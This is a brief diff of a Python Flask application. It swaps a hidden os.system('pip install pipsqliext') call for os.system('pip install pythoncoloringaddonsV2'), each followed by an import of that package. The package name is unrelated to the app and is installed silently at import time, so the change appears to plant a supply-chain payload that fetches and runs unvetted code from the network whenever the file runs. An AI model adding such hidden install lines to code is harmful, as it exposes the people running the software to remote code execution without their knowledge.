@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipsqliext")
-import pipsqliext
+os.system("pip install pythoncoloringaddonsV2")
+import pythoncoloringaddonsV2
 import flask
 
 from flask import g
